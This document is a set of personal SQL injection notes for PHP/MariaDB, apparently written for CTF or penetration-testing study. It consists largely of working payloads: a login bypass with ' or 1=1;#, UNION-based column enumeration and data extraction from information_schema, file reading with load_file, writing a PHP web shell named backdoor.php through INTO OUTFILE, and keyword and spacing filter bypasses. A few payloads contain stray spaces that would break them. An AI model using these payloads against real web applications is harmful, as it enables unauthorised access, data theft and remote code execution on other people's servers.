# SQL Injection
> Syntax for PHP/MariaDB


### Identifying
Need to find locations where data might pass through a database.
* Products on e-commerce site
* Message threads on a forum
* Authentication/login page

> To identify, throw in random characters such as ;, ', ", #, UNION SELECT, 


### Authentication Bypass
Default payload: `' or 1=1;#`

If this was sent in as the username, the sql query on the backend would change as the following:  
`select * from users where name = 'tom' or 1=1;#' and password = 'jones'; `     
The `#` will comment the rest of the query out.  
This query will return all rows where users with the name of tom   

Sometimes if there is more than one row, that might throw errors with the database, so it might be a good idea to add a LIMIT 1 to the query.  
`select * from users where name = 'tom' or 1=1 LIMIT 1;#`  


### Column number enumeration id based

**Source code:**  
`$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id']; `
  
**Enumeration:**   
`http://10.11.0.22/debug.php?id=1 order by 1`

Submit multiple queries by increasing order by number until there’s errors. Errors indicate maximum columns 

Once we know how many columns are in the table, we can use to extract more with `UNION`

`<ip>/xyz?id=1 union all select 1, 2, 3` This will return row 1 with 3 columns. Errors get thrown when we ask for things that do not exist  

The page now displays the position of the different columns so you will see 1,2,3 values in the different columns displayed  
  

### Extracting Data from the Database

> https://www.sqlinjection.net/database-fingerprinting/


`ip/xyz?id=1 union all select 1, 2, @@version` This will extract the database version and put it in where it previously put 3 for column 3


Now we can enumerate the information_schema and dig into the tables to retrieve values.  
`ip/xyz?id=1 union all select 1, 2, table_name from information_sc hema.tables`
  
Can enumerate for users in the users table:
```
SELECT *
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_NAME = users
```

### SQLi to Code Execution

`ip/xyz?id=1 union all select 1, 2, load_file('C:/Windows/System32 /drivers/etc/hosts')`

If we see error messages, we should know the location of the web root.

`ip/xyz?id=1 union all select 1, 2, "<?php echo shell_exec($_GET[' cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`

### Filter bypass

> Good enough for CTF's
> https://portswigger.net/support/sql-injection-bypassing-common-filters 


For spacing filters, can use comments:
Example: `union/**/select`

For keyword filters, can use mix of capital letters:  
`uNiOn, sElEcT`